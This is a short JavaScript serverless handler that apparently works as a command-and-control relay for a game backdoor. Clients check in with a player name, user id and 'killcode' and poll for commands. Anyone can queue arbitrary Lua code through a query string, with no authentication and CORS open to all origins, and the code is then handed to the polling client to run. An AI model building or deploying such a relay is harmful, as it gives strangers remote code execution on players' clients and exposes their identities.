let pendingCommands = {}; // key = killcode, value = { lua: "code here" }

export default function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');

    const { killcode, player, userid, lua, timestamp } = req.query;

    // Presence update
    if (player && userid && killcode) {
        console.log(`[Presence] ${player} (${userid}) with killcode ${killcode} is online`);
    }

    // Inject Lua code
    if (lua && killcode) {
        pendingCommands[killcode] = { lua };
        console.log(`[Lua queued] ${killcode}: ${lua}`);
        res.status(200).json({ status: "ok", message: "Lua queued" });
        return;
    }

    // Player polling
    if (killcode) {
        const cmd = pendingCommands[killcode] || {};
        pendingCommands[killcode] = {}; // Consume immediately
        res.status(200).json(cmd);
        return;
    }

    res.status(200).json({ status: "ok" });
}
